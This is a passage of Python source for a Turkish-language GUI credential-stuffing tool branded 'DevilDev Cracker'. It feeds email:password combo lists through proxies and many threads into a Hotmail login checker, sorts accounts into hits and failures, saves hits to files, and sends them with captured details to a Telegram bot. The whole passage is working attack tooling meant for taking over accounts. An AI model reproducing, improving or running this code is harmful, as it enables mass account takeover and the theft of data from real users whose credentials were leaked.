            self.log("[INFO] Şifre kopyalandı", "info")

    def copy_row(self):
        selected = self.tree.selection()
        if selected:
            values = self.tree.item(selected[0], "values")
            self.clipboard_clear()
            self.clipboard_append(" | ".join(values))
            self.log("[INFO] Satır kopyalandı", "info")

    def delete_row(self):
        selected = self.tree.selection()
        if selected:
            item = selected[0]
            values = self.tree.item(item, "values")
            self.hit_data = [r for r in self.hit_data if r != tuple(values)]
            self.tree.delete(item)
            self.log("[INFO] Satır silindi", "info")

    # ---------- Export ----------
    def export_stats(self):
        if not self.hit_data:
            messagebox.showwarning("Uyarı", "Dışa aktarılacak veri yok.")
            return
        filename = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV dosyası", "*.csv"), ("All Files", "*.*")]
        )
        if filename:
            with open(filename, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["Tip", "Email", "Şifre", "Eşleşen Keyword"])
                writer.writerows(self.hit_data)
            self.log(f"[INFO] Veriler {filename} dosyasına aktarıldı.", "info")
            messagebox.showinfo("Başarılı", f"Veriler {filename} dosyasına aktarıldı.")

    # ---------- Renk Teması ----------
    def change_color_theme(self, choice):
        self.color_theme = choice
        self.apply_color_theme()
        self.save_config()
        self.start_btn.configure(fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"])
        style = ttk.Style()
        style.map('Treeview', background=[('selected', self.primary_color["fg"])])

    # ---------- Combo Düzenleyici ----------
    def open_combo_editor(self):
        editor = ctk.CTkToplevel(self)
        editor.title(self.text["combo_editor"])
        editor.geometry("450x550")
        editor.resizable(False, False)
        editor.configure(fg_color="#0d0d0d")

        combo_path = self.combo_file.get().strip()
        combos = []
        if combo_path and Path(combo_path).exists():
            with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and ":" in line and not line.startswith("#"):
                        combos.append(line)

        listbox = tk.Listbox(editor, bg="#1a1a1a", fg="#ffffff", selectbackground=self.primary_color["fg"], font=("Consolas", 10))
        listbox.pack(fill="both", expand=True, padx=10, pady=10)
        for c in combos:
            listbox.insert("end", c)

        add_frame = ctk.CTkFrame(editor, fg_color="transparent")
        add_frame.pack(fill="x", padx=10, pady=5)

        entry = ctk.CTkEntry(add_frame, width=280, fg_color="#0d0d0d", border_color=self.primary_color["fg"])
        entry.pack(side="left", padx=5)

        def add_combo():
            text = entry.get().strip()
            if text and ":" in text:
                listbox.insert("end", text)
                entry.delete(0, "end")
            else:
                messagebox.showerror("Hata", "Geçerli bir email:password girin.")

        def remove_combo():
            selected = listbox.curselection()
            if selected:
                listbox.delete(selected[0])

        ctk.CTkButton(add_frame, text=self.text["add_combo"], width=70, fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"], command=add_combo).pack(side="left", padx=5)
        ctk.CTkButton(add_frame, text=self.text["remove_combo"], width=70, fg_color="#333", hover_color="#555", command=remove_combo).pack(side="left", padx=5)

        def save_combo():
            nonlocal combo_path
            if not combo_path:
                combo_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
                if not combo_path:
                    return
            with open(combo_path, "w", encoding="utf-8") as f:
                for i in range(listbox.size()):
                    f.write(listbox.get(i) + "\n")
            self.combo_file.set(combo_path)
            editor.destroy()
            self.log(f"[INFO] Combo dosyası kaydedildi: {combo_path}", "info")

        ctk.CTkButton(editor, text="Kaydet", fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"], command=save_combo).pack(pady=10)

    # ---------- Checkpoint ----------
    def check_for_checkpoint(self):
        checkpoint = load_checkpoint()
        if checkpoint and self.checkpoint_enabled.get():
            combo_file = checkpoint.get("combo_file")
            if combo_file and Path(combo_file).exists():
                response = messagebox.askyesno(
                    "Checkpoint Bulundu",
                    f"Önceki işlemden kalan checkpoint bulundu.\n"
                    f"Dosya: {combo_file}\n"
                    f"İşlenen: {checkpoint.get('processed_index', 0)} / {checkpoint.get('total_combos', 0)}\n"
                    f"Kaldığınız yerden devam etmek ister misiniz?"
                )
                if response:
                    self.combo_file.set(combo_file)
                    self.current_combo_path = combo_file
                    self.hit_data = checkpoint.get("hit_data", [])
                    for row in self.hit_data:
                        self.tree.insert("", "end", values=row)
                    self.log("[CHECKPOINT] Kaldığınız yerden devam edilecek.", "checkpoint")
                    return
                else:
                    clear_checkpoint()
                    self.log("[CHECKPOINT] Checkpoint temizlendi.", "checkpoint")
            else:
                clear_checkpoint()

    # ---------- GUI Güncelleme ----------
    def update_gui(self):
        try:
            while True:
                msg, tag = self.msg_queue.get_nowait()
                self.log(msg, tag)
        except queue.Empty:
            pass

        total_processed = self.processed_count
        hits = self.total_hits
        free = self.total_free
        bad = self.total_bad
        retry = self.total_retry

        self.box_total.configure(text=str(total_processed))
        self.box_hit.configure(text=str(hits))
        self.box_free.configure(text=str(free))
        self.box_bad.configure(text=str(bad))
        self.box_retry.configure(text=str(retry))

        speed = self.stats.get_speed()
        cpm = int(speed * 60) if speed > 0 else 0
        self.box_cpm.configure(text=str(cpm))

        success_rate = (hits / total_processed * 100) if total_processed > 0 else 0.0
        self.box_success.configure(text=f"{success_rate:.1f}%")
        self.lbl_rate.configure(text=f"{self.text['success_rate']} {success_rate:.1f}%")

        if self.total_combos > 0:
            progress = total_processed / self.total_combos
            progress = min(progress, 1.0)
            self.progress.set(progress)
            self.lbl_progress.configure(text=f"{progress*100:.1f}%")

        self.lbl_speed.configure(text=f"{self.text['speed']} {speed:.1f} combo/s")

        remaining = self.total_combos - total_processed
        if speed > 0 and remaining > 0:
            eta_sec = remaining / speed
            eta_str = self.format_time(eta_sec)
        else:
            eta_str = "∞"
        self.lbl_eta.configure(text=f"{self.text['eta']} {eta_str}")

        if len(self.stats.history) > 1:
            times, h, f, b = zip(*self.stats.history)
            self.line_hit.set_data(times, h)
            self.line_free.set_data(times, f)
            self.line_bad.set_data(times, b)
            self.ax1.relim()
            self.ax1.autoscale_view()

        if len(self.stats.rate_history) > 1:
            r_times, rates = zip(*self.stats.rate_history)
            self.line_rate.set_data(r_times, rates)
            self.ax2.relim()
            self.ax2.autoscale_view()

        self.canvas.draw_idle()

        status_text = self.text["running"] if self.running else self.text["ready"]
        color = "#00ff66" if self.running else "#00ccff"
        self.box_status.configure(text=status_text, text_color=color)

        self.after(300, self.update_gui)

    @staticmethod
    def format_time(seconds):
        if seconds < 60:
            return f"{int(seconds)}s"
        elif seconds < 3600:
            return f"{int(seconds//60)}m {int(seconds%60)}s"
        else:
            return f"{int(seconds//3600)}h {int((seconds%3600)//60)}m"

    # ---------- Yükleme ----------
    def load_combos(self, file_path):
        combos = []
        p = Path(file_path)
        if not p.exists():
            return []
        with p.open("r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and ":" in line and not line.startswith("#"):
                    email, password = line.split(":", 1)
                    combos.append((email.strip(), password.strip()))
        return combos

    def load_keywords(self, file_path):
        keywords = []
        p = Path(file_path)
        if not p.exists():
            return []
        with p.open("r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                kw = line.strip()
                if kw and not kw.startswith("#"):
                    keywords.append(kw)
        return keywords

    # ---------- Başlat / Durdur ----------
    def start_cracking(self):
        if self.running:
            return

        combo_path = self.combo_file.get().strip()
        keyword_path = self.keyword_file.get().strip()
        if not combo_path or not keyword_path:
            messagebox.showerror("Hata", "Lütfen combo ve keyword dosyalarını seçin.")
            return

        proxy_file = self.proxy_file.get().strip()
        if proxy_file and Path(proxy_file).exists():
            self.load_proxy_list(proxy_file)
        else:
            self.proxy_list = []

        checkpoint = load_checkpoint() if self.checkpoint_enabled.get() else None
        start_index = 0
        if checkpoint and checkpoint.get("combo_file") == combo_path:
            start_index = checkpoint.get("processed_index", 0)
            self.log(f"[CHECKPOINT] {start_index}. hesaptan devam ediliyor.", "checkpoint")

        combos = self.load_combos(combo_path)
        keywords = self.load_keywords(keyword_path)

        if not combos:
            messagebox.showerror("Hata", "Geçersiz veya boş combo dosyası.")
            return

        if start_index > 0:
            combos = combos[start_index:]
        else:
            clear_checkpoint()
            self.hit_data = []
            for item in self.tree.get_children():
                self.tree.delete(item)

        self.total_combos = len(combos) + start_index
        self.processed_count = start_index
        self.progress.set(0)
        self.lbl_progress.configure(text="0%")

        if start_index > 0:
            self.total_hits = sum(1 for r in self.hit_data if r[0] == "HIT")
            self.total_free = sum(1 for r in self.hit_data if r[0] == "FREE")
            self.total_bad = sum(1 for r in self.hit_data if r[0] == "BAD")
            self.total_retry = 0
        else:
            self.total_hits = 0
            self.total_free = 0
            self.total_bad = 0
            self.total_retry = 0

        token = self.tg_token.get().strip()
        chat = self.tg_chat.get().strip()
        self.notifier = TelegramNotifier(token, chat) if token and chat else None

        self.hit_file = "devildev_hits.txt"
        self.free_file = "devildev_free.txt"
        self.stats = Stats()
        self.stop_event.clear()
        self.running = True
        self.current_combo_path = combo_path

        self.start_btn.configure(state="disabled", fg_color="#444444")
        self.stop_btn.configure(state="normal", fg_color=self.primary_color["fg"])

        self.log("[INFO] İşlem başlatıldı.", "info")
        self.log(f"[INFO] Toplam combo: {self.total_combos}, Thread: {self.thread_count.get()}, Retry: {self.max_retry.get()}", "info")
        if self.proxy_list:
            self.log(f"[INFO] Proxy listesi yüklendi: {len(self.proxy_list)} adet", "info")

        work_queue = queue.Queue()
        for combo in combos:
            work_queue.put(combo)

        lock = threading.Lock()
        self.worker_threads = []
        for _ in range(self.thread_count.get()):
            t = threading.Thread(
                target=self.worker,
                args=(work_queue, lock, keywords, self.notifier, self.hit_file, self.free_file, self.stop_event)
            )
            t.daemon = True
            t.start()
            self.worker_threads.append(t)

        monitor = threading.Thread(target=self.monitor_completion, args=(work_queue, combo_path, start_index))
        monitor.daemon = True
        monitor.start()

    def stop_cracking(self):
        if not self.running:
            return
        self.running = False
        self.stop_event.set()
        self.start_btn.configure(state="normal", fg_color=self.primary_color["fg"])
        self.stop_btn.configure(state="disabled", fg_color="#444444")
        self.log("[INFO] Durdurma sinyali gönderildi.", "info")
        if self.checkpoint_enabled.get():
            save_checkpoint(self.processed_count, self.current_combo_path, self.total_combos, self.hit_data)
            self.log(f"[CHECKPOINT] {self.processed_count} / {self.total_combos} işlendi, checkpoint kaydedildi.", "checkpoint")

    def monitor_completion(self, work_queue, combo_path, start_index):
        work_queue.join()
        if self.running:
            self.running = False
            self.start_btn.configure(state="normal", fg_color=self.primary_color["fg"])
            self.stop_btn.configure(state="disabled", fg_color="#444444")
            self.log("[INFO] Tüm işlemler tamamlandı.", "info")
            clear_checkpoint()
            if self.sound_enabled.get():
                SOUNDS.get(self.sound_choice.get(), SOUNDS["beep"])()
            if HAS_TOAST:
                try:
                    toaster = ToastNotifier()
                    toaster.show_toast("DevilDev Cracker", "İşlem tamamlandı!", duration=5)
                except:
                    pass

    def worker(self, work_queue, lock, keywords, notifier, hit_file, free_file, stop_event):
        proxy = self.get_random_proxy() if self.proxy_list else None
        max_retry = self.max_retry.get()

        while not stop_event.is_set():
            try:
                item = work_queue.get(timeout=0.5)
                if item is None:
                    work_queue.task_done()
                    break
            except queue.Empty:
                continue

            email, password = item
            status = "BAD"
            captures = {}
            matches = {}
            retry_count = 0

            while retry_count <= max_retry:
                try:
                    if self.proxy_list:
                        proxy = self.get_random_proxy()
                    checker = HotmailChecker(email, password, keywords, proxy)
                    status, captures, matches = checker.run()
                    break
                except (requests.exceptions.RequestException, ConnectionError, TimeoutError) as e:
                    retry_count += 1
                    if retry_count > max_retry:
                        status = "BAD"
                        break
                    work_queue.put(item)
                    self.stats.add("retry")
                    with lock:
                        self.total_retry += 1
                        self.msg_queue.put((f"[RETRY] {email}:{password} (deneme {retry_count})", "retry"))
                    time.sleep(random.uniform(1, 3))
                    continue
                except LoginError as e:
                    if str(e) == "2FA":
                        status = "2FA"
                    else:
                        status = "BAD"
                    break
                except Exception:
                    status = "BAD"
                    break
            else:
                status = "BAD"

            if status == "HIT":
                self.stats.add("hit")
                match_str = " | ".join(f"{kw}({d['total']})" for kw, d in matches.items())
                with lock:
                    self.msg_queue.put((f"[HIT] {email}:{password} -> {match_str}", "hit"))
                    self.add_to_table("HIT", email, password, match_str)
                    self.total_hits += 1
                with open(hit_file, "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password} | {match_str}\n")
                if notifier:
                    notifier.send_hit(email, password, captures, matches)
                if self.sound_enabled.get():
                    SOUNDS.get(self.sound_choice.get(), SOUNDS["beep"])()
            elif status == "FREE":
                self.stats.add("free")
                with lock:
                    self.msg_queue.put((f"[FREE] {email}:{password}", "free"))
                    self.add_to_table("FREE", email, password, "")
                    self.total_free += 1
                with open(free_file, "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")
            else:
                self.stats.add("bad")
                with lock:
                    self.msg_queue.put((f"[BAD] {email}:{password}", "bad"))
                    self.add_to_table("BAD", email, password, "")
                    self.total_bad += 1

            with lock:
                self.processed_count += 1
                interval = self.checkpoint_interval.get()
                if self.checkpoint_enabled.get() and interval > 0 and self.processed_count % interval == 0:
                    save_checkpoint(self.processed_count, self.current_combo_path, self.total_combos, self.hit_data)

            work_queue.task_done()

if __name__ == "__main__":
    app = DevilDevApp()
    app.mainloop()